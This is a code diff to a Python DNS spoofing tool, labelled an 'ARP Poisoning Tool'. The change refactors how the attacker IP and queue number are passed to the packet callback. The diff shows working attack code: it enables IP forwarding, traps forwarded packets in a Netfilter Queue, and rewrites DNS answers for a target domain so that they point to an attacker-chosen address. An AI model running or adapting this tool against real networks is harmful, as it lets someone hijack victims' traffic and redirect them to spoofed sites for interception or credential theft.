@@ -10,11 +10,11 @@ from rules import enable_ip_forwarding, set_trap_for_forward_packets, flush_rule
 def parse_args():
     p = argparse.ArgumentParser(description="ARP Poisoning Tool")
     p.add_argument("--target-url", default="bing.com", help="Target host URL to spoof")
-    p.add_argument("--attacker-ip", default="192.168.2.254", help="IP address to redirect the target to")
+    p.add_argument("--attacker-ip", default="192.168.2.13", help="IP address to redirect the target to")
     p.add_argument("--queue-num", type=int, default=0, help="Netfilter Queue number")
     return p.parse_args()
 
-def process_packet(packet, target_url):
+def process_packet(packet, target_url, attacker_ip):
     """
     Callback function to process each packet in the Netfilter Queue. This function spoofs DNS responses for the target URL with the ATTACKER_IP.
 
@@ -29,7 +29,7 @@ def process_packet(packet, target_url):
         if target_url in qname:
             print(f"[+] Spoofing target: {qname}")
             
-            answer = scapy.DNSRR(rrname=qname, rdata=ATTACKER_IP)
+            answer = scapy.DNSRR(rrname=qname, rdata=attacker_ip)
             # Modify the DNS answer
             scapy_packet[scapy.DNS].an = answer
             # Modify the answer count
@@ -46,15 +46,15 @@ def process_packet(packet, target_url):
     
     packet.accept()
 
-def main(TARGET_URL, ATTACKER_IP, QUEUE_NUM):
+def main(target_url, attacker_ip, queue_num):
     try:
         enable_ip_forwarding()
-        set_trap_for_forward_packets(QUEUE_NUM)
+        set_trap_for_forward_packets(queue_num)
 
-        print(f"[*] DNS Spoofing started. Target: {TARGET_URL} -> Redirect to: {ATTACKER_IP}")
+        print(f"[*] DNS Spoofing started. Target: {target_url} -> Redirect to: {attacker_ip}")
 
         queue = NetfilterQueue()
-        queue.bind(QUEUE_NUM, lambda packet: process_packet(packet, TARGET_URL))
+        queue.bind(queue_num, lambda packet: process_packet(packet, target_url, attacker_ip))
         queue.run()
 
     except KeyboardInterrupt:
